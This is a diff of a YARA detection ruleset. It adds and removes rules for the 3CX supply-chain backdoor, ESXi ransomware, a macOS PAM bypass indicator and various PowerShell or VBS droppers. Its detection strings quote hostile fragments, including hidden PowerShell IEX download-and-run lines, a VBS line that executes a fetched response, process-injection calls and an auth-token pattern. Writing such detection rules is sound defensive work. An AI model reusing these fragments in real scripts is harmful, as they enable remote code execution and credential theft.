+rule APT_MAL_macOS_NK_3CX_Malicious_Samples_Mar23_1_RID3733 : APT DEMO FILE MACOS MAL NK {
+   meta:
+      description = "Detects malicious macOS application related to 3CX compromise (decrypted payload)"
+      author = "Florian Roth (Nextron Systems)"
+      reference = "https://www.reddit.com/r/crowdstrike/comments/125r3uu/20230329_situational_awareness_crowdstrike/"
+      date = "2023-03-30 17:28:21"
+      score = 80
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      hash1 = "b86c695822013483fa4e2dfdf712c5ee777d7b99cbad8c2fa2274b133481eadb"
+      hash2 = "ac99602999bf9823f221372378f95baa4fc68929bac3a10e8d9a107ec8074eca"
+      hash3 = "51079c7e549cbad25429ff98b6d6ca02dc9234e466dd9b75a5e05b9d7b95af72"
+      tags = "APT, DEMO, FILE, MACOS, MAL, NK"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $s1 = "20230313064152Z0" 
+      $s2 = "Developer ID Application: 3CX (33CF4654HL)" 
+   condition: 
+      ( uint16 ( 0 ) == 0xfeca or uint16 ( 0 ) == 0xfacf or uint32 ( 0 ) == 0xbebafeca ) and all of them
+}
+
+rule APT_MAL_MacOS_NK_3CX_DYLIB_Mar23_1_RID31AD : APT DEMO MACOS MAL NK {
+   meta:
+      description = "Detects malicious DYLIB files related to 3CX compromise"
+      author = "Florian Roth (Nextron Systems)"
+      reference = "https://www.sentinelone.com/blog/smoothoperator-ongoing-campaign-trojanizes-3cx-software-in-software-supply-chain-attack/"
+      date = "2023-03-30 13:32:41"
+      score = 80
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      hash1 = "a64fa9f1c76457ecc58402142a8728ce34ccba378c17318b3340083eeb7acc67"
+      hash2 = "fee4f9dabc094df24d83ec1a8c4e4ff573e5d9973caa676f58086c99561382d7"
+      tags = "APT, DEMO, MACOS, MAL, NK"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $xc1 = { 37 15 00 13 16 16 1B 55 4F 54 4A 5A 52 2D 13 14 1E 15 0D 09 5A 34 2E 5A 4B 4A 54 4A 41 5A 2D 13 14 4C 4E 41 5A 02 4C 4E 53 5A 3B 0A 0A 16 1F 2D 1F 18 31 13 0E 55 4F 49 4D 54 49 4C 5A 52 31 32 2E 37 36 56 5A 16 13 11 1F 5A 3D 1F 19 11 15 53 5A 39 12 08 15 17 1F 55 4B 4A 42 54 4A 54 4F 49 4F 43 54 4B 48 42 5A 29 1B 1C 1B 08 13 55 4F 49 4D 54 49 4C 7A } 
+      $xc2 = { 41 49 19 02 25 1b 0f 0e 12 25 0e 15 11 1f 14 25 19 15 14 0e 1f 14 0e 47 5f 09 41 25 25 0e 0f 0e 17 1b 47 } 
+      $xc3 = { 55 29 03 09 0e 1f 17 55 36 13 18 08 1b 08 03 55 39 15 08 1f 29 1f 08 0c 13 19 1f 09 55 29 03 09 0e 1f 17 2c 1f 08 09 13 15 14 54 0a 16 13 09 0e } 
+   condition: 
+      1 of them
+}
+
 rule APT_SUSP_NK_3CX_Malicious_Samples_Mar23_1_RID3572 : APT DEMO NK SUSP {
    meta:
       description = "Detects indicator (event name) found in samples related to 3CX compromise"
@@ -5783,6 +6686,51 @@ rule APT_SUSP_NK_3CX_Malicious_Samples_Mar23_1_RID3572 : APT DEMO NK SUSP {
       $a1 = "AVMonitorRefreshEvent" wide fullword
    condition: 
       1 of them
+}
+
+rule MAL_3CXDesktopApp_MacOS_Backdoor_Mar23_RID348D : DEMO FILE MACOS MAL {
+   meta:
+      description = "Detects 3CXDesktopApp MacOS backdoor component"
+      author = "X__Junior (Nextron Systems)"
+      reference = "https://www.volexity.com/blog/2023/03/30/3cx-supply-chain-compromise-leads-to-iconic-incident/"
+      date = "2023-03-30 15:35:21"
+      score = 80
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      
+      tags = "DEMO, FILE, MACOS, MAL"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $sa1 = "%s/.main_storage" ascii fullword
+      $sa2 = "%s/UpdateAgent" ascii fullword
+      $op1 = { 31 C0 41 80 34 06 ?? 48 FF C0 48 83 F8 ?? 75 ?? BE ?? ?? ?? ?? BA ?? ?? ?? ?? 4C 89 F7 48 89 D9 E8 ?? ?? ?? ?? 48 89 DF E8 ?? ?? ?? ?? 48 89 DF E8 ?? ?? ?? ?? 4C 89 F7 5B 41 5E 41 5F E9 ?? ?? ?? ?? 5B 41 5E 41 5F C3 } 
+      $op2 = { 0F 11 84 24 ?? ?? ?? ?? 0F 28 05 ?? ?? ?? ?? 0F 29 84 24 ?? ?? ?? ?? 0F 28 05 ?? ?? ?? ?? 0F 29 84 24 ?? ?? ?? ?? 31 C0 80 B4 04 ?? ?? ?? ?? ?? 48 FF C0 } 
+   condition: 
+      ( ( uint16 ( 0 ) == 0xfeca or uint16 ( 0 ) == 0xfacf or uint32 ( 0 ) == 0xbebafeca ) and filesize < 6MB and ( ( 1 of ( $sa* ) and 1 of ( $op* ) ) or all of ( $sa* ) ) ) or ( all of ( $op* ) )
+}
+
+rule MAL_3CXDesktopApp_MacOS_UpdateAgent_Mar23_RID35BA : DEMO MACOS MAL {
+   meta:
+      description = "Detects 3CXDesktopApp MacOS UpdateAgent backdoor component"
+      author = "Florian Roth (Nextron Systems)"
+      reference = "https://twitter.com/patrickwardle/status/1641692164303515653?s=20"
+      date = "2023-03-30 16:25:31"
+      score = 80
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      
+      tags = "DEMO, MACOS, MAL"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $a1 = "/3CX Desktop App/.main_storage" ascii
+      $x1 = ";3cx_auth_token_content=%s;__tutma=true" 
+      $s1 = "\"url\": \"https://" 
+      $s3 = "/dev/null" 
+      $s4 = "\"AccountName\": \"" 
+   condition: 
+      uint16 ( 0 ) == 0xfeca and filesize < 6MB and ( 1 of ( $x* ) or ( $a1 and all of ( $s* ) ) ) or all of them
 }
 
 rule APT_MAL_NK_3CX_Malicious_Samples_Mar23_2_RID3502 : APT DEMO EXE MAL NK {
@@ -6033,6 +6981,32 @@ rule MAL_RANSOM_SH_ESXi_Attacks_Feb23_1_RID3257 : CRIME DEMO MAL RANSOM SCRIPT {
       $s2 = "/bin/find / -name *.log -exec /bin" ascii fullword
    condition: 
       uint16 ( 0 ) == 0x2123 and filesize < 10KB and ( 1 of ( $x* ) or 2 of them ) or 3 of them
+}
+
+rule MAL_RANSOM_ELF_ESXi_Attacks_Feb23_1_RID3293 : CRIME DEMO LINUX MAL RANSOM {
+   meta:
+      description = "Detects ransomware exploiting and encrypting ESXi servers"
+      author = "Florian Roth"
+      reference = "https://www.bleepingcomputer.com/forums/t/782193/esxi-ransomware-help-and-support-topic-esxiargs-args-extension/page-14"
+      date = "2023-02-04 14:11:01"
+      score = 85
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      hash1 = "11b1b2375d9d840912cfd1f0d0d04d93ed0cddb0ae4ddb550a5b62cd044d6b66"
+      tags = "CRIME, DEMO, LINUX, MAL, RANSOM"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $x1 = "usage: encrypt <public_key> <file_to_encrypt> [<enc_step>] [<enc_size>] [<file_size>]" ascii fullword
+      $x2 = "[ %s ] - FAIL { Errno: %d }" ascii fullword
+      $s1 = "lPEM_read_bio_RSAPrivateKey" ascii fullword
+      $s2 = "lERR_get_error" ascii fullword
+      $s3 = "get_pk_data: key file is empty!" ascii fullword
+      $op1 = { 8b 45 a8 03 45 d0 89 45 d4 8b 45 a4 69 c0 07 53 65 54 89 45 a8 8b 45 a8 c1 c8 19 } 
+      $op2 = { 48 89 95 40 fd ff ff 48 83 bd 40 fd ff ff 00 0f 85 2e 01 00 00 48 8b 9d 50 ff ff ff 48 89 9d 30 fd ff ff 48 83 bd 30 fd ff ff 00 78 13 f2 48 0f 2a 85 30 fd ff ff } 
+      $op3 = { 31 55 b4 f7 55 b8 8b 4d ac 09 4d b8 8b 45 b8 31 45 bc c1 4d bc 13 c1 4d b4 1d } 
+   condition: 
+      uint16 ( 0 ) == 0x457f and filesize < 200KB and ( 1 of ( $x* ) or 3 of them ) or 4 of them
 }
 
 rule SUSP_Email_Suspicious_OneNote_Attachment_Jan23_1_RID3925 : DEMO SUSP {
@@ -6355,6 +7329,25 @@ rule EXPL_LOG_ProxyNotShell_PowerShell_Proxy_Log_Dec22_1_RID39FA : CVE_2022_4104
       $fp3 = "Exchange BackEnd Probes" ascii wide fullword
    condition: 
       $re1 and not 1 of ( $fp* )
+}
+
+rule EXPL_MacOS_Switcharoo_Indicator_Dec22_RID34A9 : CVE_2022_46689 DEMO EXPLOIT MACOS {
+   meta:
+      description = "Detects indicators found after exploitations of CVE-2022-46689"
+      author = "Florian Roth"
+      reference = "https://github.com/zhuowei/MacDirtyCowDemo"
+      date = "2022-12-19 15:40:01"
+      score = 65
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      
+      tags = "CVE_2022_46689, DEMO, EXPLOIT, MACOS"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $x1 = "auth       sufficient     pam_permit.so" ascii
+   condition: 
+      filesize < 1KB and $x1
 }
 
 rule HKTL_Venom_LIB_Dec22_RID2DAD : DEMO EXE FILE HKTL {
@@ -6771,6 +7764,44 @@ rule EXPL_GitLab_CE_RCE_CVE_2021_22205_RID30B7 : CVE_2021_22205 DEMO EXPLOIT {
       $sc3 = "1c2VyLnNhdmUh" ascii
    condition: 
       1 of ( $sa* ) and 1 of ( $sb* ) and 1 of ( $sc* )
+}
+
+rule VULN_LNX_OMI_RCE_CVE_2021_386471_Sep21_RID320B : CVE_2021_38647 CVE_2021_386471 DEMO FILE LINUX VULN {
+   meta:
+      description = "Detects a Linux OMI version vulnerable to CVE-2021-38647 (OMIGOD) which enables an unauthenticated RCE"
+      author = "Christian Burkard"
+      reference = "https://www.wiz.io/blog/secret-agent-exposes-azure-customers-to-unauthorized-code-execution"
+      date = "2021-09-16 13:48:21"
+      score = 50
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      
+      tags = "CVE_2021_38647, CVE_2021_386471, DEMO, FILE, LINUX, VULN"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $a1 = "/opt/omi/bin/omiagent" ascii fullword
+      $s1 = "OMI-1.6.8-0 - " ascii
+      $s2 = "OMI-1.6.6-0 - " ascii
+      $s3 = "OMI-1.6.4-1 - " ascii
+      $s4 = "OMI-1.6.4-0 - " ascii
+      $s5 = "OMI-1.6.2-0 - " ascii
+      $s6 = "OMI-1.6.1-0 - " ascii
+      $s7 = "OMI-1.5.0-0 - " ascii
+      $s8 = "OMI-1.4.4-0 - " ascii
+      $s9 = "OMI-1.4.3-2 - " ascii
+      $s10 = "OMI-1.4.3-1 - " ascii
+      $s11 = "OMI-1.4.3-0 - " ascii
+      $s12 = "OMI-1.4.2-5 - " ascii
+      $s13 = "OMI-1.4.2-4 - " ascii
+      $s14 = "OMI-1.4.2-3 - " ascii
+      $s15 = "OMI-1.4.2-2 - " ascii
+      $s16 = "OMI-1.4.2-1 - " ascii
+      $s17 = "OMI-1.4.1-1 - " ascii
+      $s18 = "OMI-1.4.1-0 - " ascii
+      $s19 = "OMI-1.4.0-6 - " ascii
+   condition: 
+      uint32be ( 0 ) == 0x7f454c46 and $a1 and 1 of ( $s* )
 }
 
 rule APT_FIN7_MsDoc_Sep21_1_RID2E18 : APT DEMO FILE G0046 RUSSIA {
@@ -7719,26 +8750,6 @@ rule SUSP_Just_EICAR_RID2C24 : DEMO FILE SUSP {
       uint16 ( 0 ) == 0x3558 and filesize < 70 and $s1 at 0
 }
 
-rule MAL_CMD_Script_Obfuscated_Feb19_1_RID32B7 : DEMO FILE MAL OBFUS SCRIPT T1059 {
-   meta:
-      description = "Detects obfuscated batch script using env variable sub-strings"
-      author = "Florian Roth"
-      reference = "https://twitter.com/DbgShell/status/1101076457189793793"
-      date = "2019-03-01 14:17:01"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "deed88c554c8f9bef4078e9f0c85323c645a52052671b94de039b438a8cff382"
-      tags = "DEMO, FILE, MAL, OBFUS, SCRIPT, T1059"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $h1 = { 40 65 63 68 6F 20 6F 66 66 0D 0A 73 65 74 20 } 
-      $s1 = { 2C 31 25 0D 0A 65 63 68 6F 20 25 25 } 
-   condition: 
-      uint16 ( 0 ) == 0x6540 and filesize < 200KB and $h1 at 0 and uint16 ( filesize - 3 ) == 0x0d25 and uint8 ( filesize - 1 ) == 0x0a and $s1 in ( filesize - 200 .. filesize )
-}
-
 rule HKTL_Dsniff_RID2AFD : APT DEMO HKTL {
    meta:
       description = "Detects Dsniff hack tool"
@@ -8254,6 +9265,27 @@ rule APT_RANCOR_DDKONG_Malware_Exports_RID32AC : APT DEMO EXE FILE G0075 {
       uint16 ( 0 ) == 0x5a4d and pe.exports ( "ServiceMain" ) and pe.exports ( "Rundll32Call" ) and pe.exports ( "DllEntryPoint" ) and pe.number_of_exports == 3
 }
 
+rule SUSP_ELF_Tor_Client_RID2DE4 : APT DEMO FILE LINUX SUSP {
+   meta:
+      description = "Detects ELF Linux Tor client"
+      author = "Florian Roth"
+      reference = "Internal Research"
+      date = "2018-05-24 10:51:11"
+      score = 75
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      hash1 = "afd281639e26a717aead65b1886f98d6d6c258736016023b4e59de30b7348719"
+      tags = "APT, DEMO, FILE, LINUX, SUSP"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $x1 = "We needed to load a secret key from %s, but it was encrypted. Try 'tor --keygen' instead, so you can enter the passphrase." ascii fullword
+      $x2 = "Received a VERSION cell with odd payload length %d; closing connection." ascii fullword
+      $x3 = "Please upgrade! This version of Tor (%s) is %s, according to the directory authorities. Recommended versions are: %s" ascii fullword
+   condition: 
+      uint16 ( 0 ) == 0x457f and 1 of them
+}
+
 rule SUSP_Bad_PDF_RID2AFB : DEMO FILE SUSP {
    meta:
       description = "Detects PDF that embeds code to steal NTLM hashes"
@@ -8273,31 +9305,6 @@ rule SUSP_Bad_PDF_RID2AFB : DEMO FILE SUSP {
       $s3 = "<</F (\\\\" ascii
    condition: 
       ( uint32 ( 0 ) == 0x46445025 or uint32 ( 0 ) == 0x4450250a ) and 1 of them
-}
-
-rule SUSP_PowerShell_String_K32_RemProcess_RID3507 : DEMO FILE SCRIPT SUSP T1059 T1059_001 {
-   meta:
-      description = "Detects suspicious PowerShell code that uses Kernel32, RemoteProccess handles or shellcode"
-      author = "Florian Roth"
-      reference = "https://github.com/nccgroup/redsnarf"
-      date = "2018-03-31 15:55:41"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash3 = "54a8dd78ec4798cf034c7765d8b2adfada59ac34d019e77af36dcaed1db18912"
-      tags = "DEMO, FILE, SCRIPT, SUSP, T1059, T1059_001"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $x1 = "Throw \"Unable to allocate memory in the remote process for shellcode\"" fullword ascii
-      $x2 = "$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(\"kernel32.dll\")" fullword ascii
-      $s3 = "$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants." ascii
-      $s7 = "if ($RemoteProcHandle -eq [IntPtr]::Zero)" fullword ascii
-      $s8 = "if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))" fullword ascii
-      $s9 = "$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, " ascii
-      $s15 = "$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null" fullword ascii
-   condition: 
-      uint16 ( 0 ) == 0x7566 and filesize < 6000KB and 1 of them
 }
 
 rule Lazagne_PW_Dumper_RID2DA5 : DEMO HKTL T1003 {
@@ -8340,81 +9347,6 @@ rule Gsecdump_password_dump_file_RID322F : DEMO FILE SUSP T1003 {
       uint32be ( 0 ) == 0x41646d69 and filesize < 3000 and $x1 at 0
 }
 
-rule VBS_Obfuscated_Mal_Feb18_1_RID3039 : DEMO MAL OBFUS SCRIPT T1059 {
-   meta:
-      description = "Detects malicious obfuscated VBS observed in February 2018"
-      author = "Florian Roth"
-      reference = "https://www.virustotal.com/gui/file/c03da12acbe7f7dfed6219f8809f377fb35b6100a0e560ac0f55313d34f0db17/detection"
-      date = "2018-02-12 12:30:41"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      modified = "2024-07-19"
-      hash1 = "06960cb721609fe5a857fe9ca3696a84baba88d06c20920370ddba1b0952a8ab"
-      hash2 = "c5c0e28093e133d03c3806da0061a35776eed47d351e817709d2235b95d3a036"
-      hash3 = "e1765a2b10e2ff10235762b9c65e9f5a4b3b47d292933f1a710e241fe0417a74"
-      tags = "DEMO, MAL, OBFUS, SCRIPT, T1059"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $x1 = "A( Array( (1* 2^1 )+" ascii
-      $x2 = ".addcode(A( Array(" ascii
-      $x3 = "false:AA.send:Execute(AA.responsetext):end" ascii
-      $x4 = "& A( Array(  (1* 2^1 )+" ascii
-      $s1 = ".SYSTEMTYPE:NEXT:IF (UCASE(" ascii
-      $s2 = "A = STR:next:end function" ascii
-      $s3 = "&WSCRIPT.SCRIPTFULLNAME&CHR" fullword ascii
-   condition: 
-      filesize < 600KB and ( 1 of ( $x* ) or 3 of them )
-}
-
-rule Turla_Mal_Script_Jan18_1_RID2FD7 : DEMO G0010 MAL RUSSIA SCRIPT T1059 {
-   meta:
-      description = "Detects Turla malicious script"
-      author = "Florian Roth"
-      reference = "https://ghostbin.com/paste/jsph7"
-      date = "2018-01-19 12:14:21"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "180b920e9cea712d124ff41cd1060683a14a79285d960e17f0f49b969f15bfcc"
-      tags = "DEMO, G0010, MAL, RUSSIA, SCRIPT, T1059"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $s1 = ".charCodeAt(i % " ascii
-      $s2 = "{WScript.Quit();}" fullword ascii
-      $s3 = ".charAt(i)) << 10) |" ascii
-      $s4 = " = WScript.Arguments;var " ascii
-      $s5 = "= \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";var i;" ascii
-   condition: 
-      filesize < 200KB and 2 of them
-}
-
-rule VBS_dropper_script_Dec17_1_RID30AE : DEMO SCRIPT T1059 {
-   meta:
-      description = "Detects a supicious VBS script that drops an executable"
-      author = "Florian Roth"
-      reference = "Internal Research"
-      date = "2018-01-01 12:50:11"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      
-      tags = "DEMO, SCRIPT, T1059"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $s1 = "TVpTAQEAAAAEAA" 
-      $s2 = "TVoAAAAAAAAAAA" 
-      $s3 = "TVqAAAEAAAAEAB" 
-      $s4 = "TVpQAAIAAAAEAA" 
-      $s5 = "TVqQAAMAAAAEAA" 
-      $a1 = "= CreateObject(\"Wscript.Shell\")" fullword ascii
-   condition: 
-      filesize < 600KB and $a1 and 1 of ( $s* )
-}
-
 rule RemCom_RemoteCommandExecution_RID3292 : DEMO HKTL T1021_002 remcom {
    meta:
       description = "Detects strings from RemCom tool"
@@ -8434,112 +9366,6 @@ rule RemCom_RemoteCommandExecution_RID3292 : DEMO HKTL T1021_002 remcom {
       $ = "\\ADMIN$\\System32\\%s%s" 
    condition: 
       1 of them
-}
-
-rule PowerShell_Suite_Hacktools_Gen_Strings_RID3648 : DEMO GEN SCRIPT T1059 T1059_001 {
-   meta:
-      description = "Detects strings from scripts in the PowerShell-Suite repo"
-      author = "Florian Roth"
-      reference = "https://github.com/FuzzySecurity/PowerShell-Suite"
-      date = "2017-12-27 16:49:11"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "79071ba5a984ee05903d566130467483c197cbc2537f25c1e3d7ae4772211fe0"
-      hash2 = "db31367410d0a9ffc9ed37f423a4b082639591be7f46aca91f5be261b23212d5"
-      hash3 = "4f51e7676a4d54c1962760ca0ac81beb28008451511af96652c31f4f40e8eb8e"
-      tags = "DEMO, GEN, SCRIPT, T1059, T1059_001"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $ = "[!] NtCreateThreadEx failed.." fullword ascii
-      $ = "[?] Executing mmc.." ascii
-      $ = "[!] This method is only supported on 64-bit!" fullword ascii
-      $ = "$LNK = [ShellLink.Shortcut]::FromByteArray($LNKHeader.GetBytes())" fullword ascii
-      $ = "$CallResult = [UACTokenMagic]::TerminateProcess($ShellExecuteInfo.hProcess, 1)" fullword ascii
-      $ = "[!] Unable to open process (as Administrator), this may require SYSTEM access." fullword ascii
-      $ = "[!] Error, NTSTATUS Value: " ascii
-      $ = "[!] UAC artifact: " ascii
-      $ = "[>] Process dump success!" ascii
-      $ = "[!] Process dump failed!" ascii
-      $ = "[+] Eidolon entry point:" fullword ascii
-      $ = "Wait for shellcode to run" fullword ascii
-      $ = "$Command = Read-Host \"`nSMB shell\"" fullword ascii
-      $ = "Use Netapi32::NetSessionEnum to enumerate active sessions on domain joined machines." fullword ascii
-      $ = "Invoke-CreateProcess -Binary C:\\Windows\\System32\\" ascii
-      $ = "[?] Thread belongs to: " ascii
-      $ = "[?] Operating system core count: " ascii
-      $ = "[>] Calling Advapi32::LookupPrivilegeValue --> SeDebugPrivilege" fullword ascii
-      $ = "Calling Advapi32::OpenProcessToken --> LSASS" ascii
-      $ = "[!] Mmm, something went wrong! GetLastError returned:" ascii
-      $ = "if (($FileBytes[0..1] | % {[Char]$_}) -join '' -cne 'MZ')" fullword ascii
-   condition: 
-      filesize < 100KB and 1 of them
-}
-
-rule PowerShell_Suite_Eidolon_RID30A8 : DEMO FILE SCRIPT T1059 T1059_001 {
-   meta:
-      description = "Detects PowerShell Suite Eidolon script - file Start-Eidolon.ps1"
-      author = "Florian Roth"
-      reference = "https://github.com/FuzzySecurity/PowerShell-Suite"
-      date = "2017-12-27 12:49:11"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "db31367410d0a9ffc9ed37f423a4b082639591be7f46aca91f5be261b23212d5"
-      tags = "DEMO, FILE, SCRIPT, T1059, T1059_001"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $ = "[+] Eidolon entry point:" ascii
-      $ = "C:\\PS> Start-Eidolon -Target C:\\Some\\File.Path -Mimikatz -Verbose" fullword ascii
-      $ = "[Int16]$PEArch = '0x{0}' -f ((($PayloadBytes[($OptOffset+1)..($OptOffset)]) | % {$_.ToString('X2')}) -join '')" fullword ascii
-   condition: 
-      uint16 ( 0 ) == 0x7566 and filesize < 13000KB and 1 of them
-}
-
-rule Invoke_PSImage_RID2C62 : DEMO SCRIPT T1059 T1059_001 {
-   meta:
-      description = "Detects a command to execute PowerShell from String"
-      author = "Florian Roth"
-      reference = "https://github.com/peewpw/Invoke-PSImage"
-      date = "2017-12-16 09:46:51"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      
-      tags = "DEMO, SCRIPT, T1059, T1059_001"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $ = "IEX([System.Text.Encoding]::ASCII.GetString(" ascii wide
-      $ = "System.Drawing.Bitmap((a Net.WebClient).OpenRead(" ascii wide
-      $ = { 89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52 00 00 04 E4 00 00 03 A0 08 06 00 00 00 9D AF A9 E8 00 00 00 09 70 48 59 73 00 00 19 D6 00 00 19 D6 01 18 D1 CA ED 00 00 00 07 74 49 4D 45 07 E1 0C 0F 13 1E 36 89 C4 28 BF 00 00 00 07 74 45 58 74 41 75 74 68 6F 72 00 A9 AE CC 48 00 00 00 0C 74 45 58 74 44 65 73 63 72 69 70 74 69 6F 6E 00 13 09 21 23 00 00 00 0A 74 45 58 74 43 6F 70 79 72 69 67 68 74 00 AC 0F CC 3A 00 00 00 0E 74 45 58 74 43 72 65 61 74 69 6F 6E 20 74 69 6D 65 00 35 F7 0F } 
-   condition: 
-      filesize < 3000KB and 1 of them
-}
-
-rule Suspicious_JS_script_content_RID3292 : DEMO SCRIPT T1059 T1059_007 T1218_010 {
-   meta:
-      description = "Detects suspicious statements in JavaScript files"
-      author = "Florian Roth"
-      reference = "Research on Leviathan https://www.proofpoint.com/us/threat-insight/post/leviathan-espionage-actor-spearphishes-maritime-and-defense-targets"
-      date = "2017-12-02 14:10:51"
-      score = 70
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      modified = "2024-07-19"
-      hash1 = "fc0fad39b461eb1cfc6be57932993fcea94fca650564271d1b74dd850c81602f"
-      tags = "DEMO, SCRIPT, T1059, T1059_007, T1218_010"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $x1 = "new ActiveXObject('WScript.Shell')).Run('cmd /c " ascii
-      $x2 = ".Run('regsvr32 /s /u /i:" ascii
-      $x3 = "new ActiveXObject('WScript.Shell')).Run('regsvr32 /s" fullword ascii
-      $x4 = "args='/s /u /i:" ascii
-   condition: 
-      ( filesize < 10KB and 1 of them )
 }
 
 rule Webshell_FOPO_Obfuscation_APT_ON_Nov17_1_RID3580 : APT DEMO FILE NK OBFUS T1505_003 WEBSHELL {
@@ -8564,7 +9390,7 @@ rule Webshell_FOPO_Obfuscation_APT_ON_Nov17_1_RID3580 : APT DEMO FILE NK OBFUS T
       uint16 ( 0 ) == 0x3f3c and filesize < 800KB and ( $x1 or ( $s1 in ( 0 .. 350 ) and $f1 at ( filesize - 23 ) ) )
 }
 
-rule URL_File_Local_EXE_RID2D6E : DEMO SCRIPT T1059 {
+rule URL_File_Local_EXE_RID2D6E : DEMO SCRIPT {
    meta:
       description = "Detects an .url file that points to a local executable"
       author = "Florian Roth"
@@ -8574,7 +9400,7 @@ rule URL_File_Local_EXE_RID2D6E : DEMO SCRIPT T1059 {
       customer = "demo"
       license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
       
-      tags = "DEMO, SCRIPT, T1059"
+      tags = "DEMO, SCRIPT"
       minimum_yara = "3.5.0"
       
    strings:
@@ -8608,49 +9434,6 @@ rule redSails_PY_RID2B50 : DEMO HKTL SCRIPT T1059_006 {
       1 of them
 }
 
-rule Susp_PowerShell_Sep17_1_RID2F9F : ANOMALY DEMO SCRIPT SUSP T1059 T1059_001 {
-   meta:
-      description = "Detects suspicious PowerShell script in combo with VBS or JS "
-      author = "Florian Roth"
-      reference = "Internal Research"
-      date = "2017-09-30 12:05:01"
-      score = 60
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "8e28521749165d2d48bfa1eac685c985ac15fc9ca5df177d4efadf9089395c56"
-      tags = "ANOMALY, DEMO, SCRIPT, SUSP, T1059, T1059_001"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $x1 = "Process.Create(\"powershell.exe -nop -w hidden" fullword ascii nocase
-      $x2 = ".Run\"powershell.exe -nop -w hidden -c \"\"IEX " ascii
-      $s1 = "window.resizeTo 0,0" fullword ascii
-   condition: 
-      ( filesize < 2KB and 1 of them )
-}
-
-rule Susp_PowerShell_Sep17_2_RID2FA0 : ANOMALY DEMO FILE SCRIPT SUSP T1059 T1059_001 {
-   meta:
-      description = "Detects suspicious PowerShell script in combo with VBS or JS "
-      author = "Florian Roth"
-      reference = "Internal Research"
-      date = "2017-09-30 12:05:11"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "e387f6c7a55b85e0675e3b91e41e5814f5d0ae740b92f26ddabda6d4f69a8ca8"
-      tags = "ANOMALY, DEMO, FILE, SCRIPT, SUSP, T1059, T1059_001"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $x1 = ".Run \"powershell.exe -nop -w hidden -e " ascii
-      $x2 = "FileExists(path + \"\\..\\powershell.exe\")" fullword ascii
-      $x3 = "window.moveTo -4000, -4000" fullword ascii
-      $s1 = "= CreateObject(\"Wscript.Shell\")" fullword ascii
-   condition: 
-      filesize < 20KB and ( ( uint16 ( 0 ) == 0x733c and 1 of ( $x* ) ) or 2 of them )
-}
-
 rule ALFA_SHELL_RID29FC : DEMO SCRIPT T1505_003 WEBSHELL {
    meta:
       description = "Detects web shell often used by Iranian APT groups"
@@ -8673,30 +9456,6 @@ rule ALFA_SHELL_RID29FC : DEMO SCRIPT T1505_003 WEBSHELL {
       $f1 = { 76 2F 38 76 2F 36 76 2F 2B 76 2F 2F 66 38 46 27 29 3B 3F 3E 0D 0A } 
    condition: 
       ( filesize < 900KB and 2 of ( $x* ) or $f1 at ( filesize - 22 ) )
-}
-
-rule WScriptShell_Case_Anomaly_RID30E0 : ANOMALY DEMO OBFUS SCRIPT SUSP T1059 {
-   meta:
